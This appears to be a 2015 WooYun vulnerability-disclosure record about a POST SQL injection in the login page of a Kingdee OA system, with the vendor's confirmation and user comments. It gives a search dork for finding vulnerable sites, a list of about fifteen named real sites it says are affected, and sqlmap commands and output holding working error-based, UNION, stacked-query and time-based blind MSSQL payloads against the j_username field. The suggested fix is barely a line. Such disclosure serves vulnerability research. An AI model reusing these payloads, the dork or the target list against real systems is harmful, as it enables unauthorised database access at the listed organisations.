{"id": 66180, "wybug_id": "wooyun-2015-0128680", "wybug_title": "金蝶某OA办公系统通用POST注入漏洞", "wybug_corp": "金蝶", "wybug_author": "0x 80", "wybug_date": "2015-07-23 17:32", "wybug_open_date": "2015-10-22 10:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-22：\t细节向公众公开  简要描述： 金蝶某OA办公系统通用POST注入漏洞居然是通用注入，没注意 详细说明：  G.CN 百度 inurl:/themes/mskin/login/inurl://mskin/login/\n\n\n\n\nPOST data: j_mode=dynamic&j_from=oa&selectLoginType=static&j_username=&j_password=&Submit=login\n存在POST注入受影响的站：http://www.mm-office.com:7890/easoa/themes/mskin/login/login.jsphttp://113.106.196.36:7890/oa/themes/mskin/login/login.jsphttp://newoa.qingyitang.com:7890/oa/themes/mskin/login/login.jsphttp://oa.hdbp.com/themes/mskin/login/login.jsphttp://www.gowellchina.com/oa/themes/mskin/login/login.jsphttp://oa.xpngs.com/oa/themes/mskin/login/login.jsphttp://wt.zhengtongauto.com/oa/themes/mskin/login/login.jsphttp://oa.hebcs.com:7890/oa/themes/mskin/login/login.jsphttp://newoa.qingyitang.com:7890/oa/themes/mskin/login/login.jsphttp://oa.gongchuang.net:81/oa/themes/mskin/login/login.jsphttp://oa.xpngs.com/oa/themes/mskin/login/login.jsphttp://oa.fghev.com:7890/oa/themes/mskin/login/login.jsphttp://60.173.150.111:7890/easoa/themes/mskin/login/login.jsphttp://oa.gdchangda.cn:7890/easoa/themes/mskin/login/login.jsphttp://oa.jimbshoes.com/oa/themes/mskin/login/login.jsp?login_error=quithttp://oa.gdchangda.cn:7890/easoa/themes/mskin/login/login.jsphttp://www.laoken.com:7890/oa/themes/mskin/login/loginFullScreen.jsp?login_error=\n\n   漏洞证明：  POST sqlmap.py -u  http://www.mm-office.com:7890/easoa/themes/mskin/login/login.jsp --forms --dbsPlace: POSTParameter: j_username    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: j_mode=static&j_from=oa&j_locale=zh_CN&selectLoginType=static&j_username=RACd' AND 9158=CONVERT(INT,(CHAR(58) CHAR(107) CHAR(104) CHAR(109) CHAR(58) (SELECT (CASE WHEN (9158=9158) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(99) CHAR(112) CHAR(102) CHAR(58))) AND 'wnuh'='wnuh&j_password=&Submit=login    Type: UNION query    Title: Generic UNION query (NULL) - 5 columns    Payload: j_mode=static&j_from=oa&j_locale=zh_CN&selectLoginType=static&j_username=RACd' UNION ALL SELECT NULL,NULL,CHAR(58) CHAR(107) CHAR(104) CHAR(109) CHAR(58) CHAR(78) CHAR(113) CHAR(82) CHAR(89) CHAR(102) CHAR(119) CHAR(84) CHAR(100) CHAR(69) CHAR(80) CHAR(58) CHAR(99) CHAR(112) CHAR(102) CHAR(58),NULL,NULL--&j_password=&Submit=login    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: j_mode=static&j_from=oa&j_locale=zh_CN&selectLoginType=static&j_username=RACd'; WAITFOR DELAY '0:0:5'--&j_password=&Submit=login    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: j_mode=static&j_from=oa&j_locale=zh_CN&selectLoginType=static&j_username=RACd' WAITFOR DELAY '0:0:5'--&j_password=&Submit=login---do you want to exploit this SQL injection? [Y/n] y[14:22:16] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2000 or 7web application technology: Servlet 2.5, JSP, JSP 2.1back-end DBMS: Microsoft SQL Server 2008\n\nhttp://oa.hdbp.com/themes/mskin/login/login.jsp\n\n\n\n\nI[14:27:08] [ERROR] unable to properly validate last character value ('M')..M[14:27:14] [ERROR] invalid character detected. retrying..[14:27:14] [WARNING] increasing time delay to 2 seconds[14:27:21] [ERROR] invalid character detected. retrying..[14:27:21] [WARNING] increasing time delay to 3 seconds[14:27:34] [ERROR] invalid character detected. retrying..[14:27:34] [WARNING] increasing time delay to 4 seconds[14:27:46] [ERROR] invalid character detected. retrying..[14:27:46] [WARNING] increasing time delay to 5 secondsECONV[14:30:04] [ERROR] invalid character detected. retrying..[14:30:04] [WARNING] increasing time delay to 6 seconds[14:30:20] [ERROR] unable to properly validate last character value ('b')..b[14:30:53] [ERROR] invalid character detected. retrying..[14:30:53] [WARNING] increasing time delay to 2 seconds[14:31:10] [ERROR] invalid character detected. retrying..[14:31:10] [WARNING] increasing time delay to 3 seconds[14:31:23] [ERROR] invalid character detected. retrying..[14:31:23] [WARNING] increasing time delay to 4 seconds[14:31:48] [ERROR] invalid character detected. retrying..[14:31:48] [WARNING] increasing time delay to 5 seconds[14:32:23] [ERROR] invalid character detected. retrying..[14:32:23] [WARNING] increasing time delay to 6 secondsRT!A[14:33:27] [INFO] retrieved:[14:33:43] [ERROR] unable to properly validate last character value ('e')..eL[14:33:59] [ERROR] invalid character detected. retrying..[14:33:59] [WARNING] increasing time delay to 2 secondsO[14:34:24] [ERROR] invalid character detected. retrying..[14:34:24] [WARNING] increasing time delay to 3 secondsW[14:34:53] [ERROR] invalid character detected. retrying..[14:34:53] [WARNING] increasing time delay to 4 seconds\n\n\n\n\n\n\nPOST sqlmap.py -uhttp://oa.gdchangda.cn:7890/easoa/themes/mskin/login/login.jsp --forms --dbs\n\n   修复方案：  POST注入，参数   版权声明：转载请注明来源 0x 80@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-07-24 10:21 厂商回复： 谢谢对金蝶的关注，为我们发现安全漏洞。我们已通知相关部门修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-23 18:54 |    \t\t泪雨无魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:43        )\t\t \n  洞主  一天提好几个漏洞啊！  有没有一些渗透视频教程啊    \n     2015-07-23 20:03 |    \t\t0x 80 \t\t\t( 普通白帽子  |\t\t\t        Rank:1331 漏洞数:398        | 某安全公司招聘系统运维、渗透测试、安全运...)\t\t \n  @泪雨无魂 没有额    \n     2015-07-23 20:03 |    \t\t0x 80 \t\t\t( 普通白帽子  |\t\t\t        Rank:1331 漏洞数:398        | 某安全公司招聘系统运维、渗透测试、安全运...)\t\t \n  @0x 80 你到我群里看看吧    \n     2015-07-24 00:11 |    \t\t泪雨无魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:43        )\t\t \n  @0x 80 我已经加入你的群了，希望能向你学习。。    \n     2015-08-20 15:22 |    \t\t小懒虫 \t\t\t( 普通白帽子  |\t\t\t        Rank:198 漏洞数:37        )\t\t \n  @0x 80 请问群多少    \n     2015-08-20 15:42 |    \t\t0x 80 \t\t\t( 普通白帽子  |\t\t\t        Rank:1331 漏洞数:398        | 某安全公司招聘系统运维、渗透测试、安全运...)\t\t \n  @小懒虫  182910788    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}